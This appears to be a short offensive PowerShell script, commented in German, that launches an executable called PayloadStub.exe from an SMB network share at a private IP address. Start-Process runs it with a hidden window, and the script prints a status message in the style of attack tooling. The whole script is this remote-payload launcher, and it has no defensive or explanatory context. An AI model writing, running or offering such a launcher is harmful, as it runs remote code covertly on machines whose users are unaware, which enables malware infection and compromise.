# PowerShell: Remote Payload aus SMB starten
$payloadPath = "\\192.168.178.100\share\PayloadStub.exe"
Write-Host "[*] Starte Payload aus Netzwerkpfad..." -ForegroundColor Cyan
Start-Process $payloadPath -WindowStyle Hidden
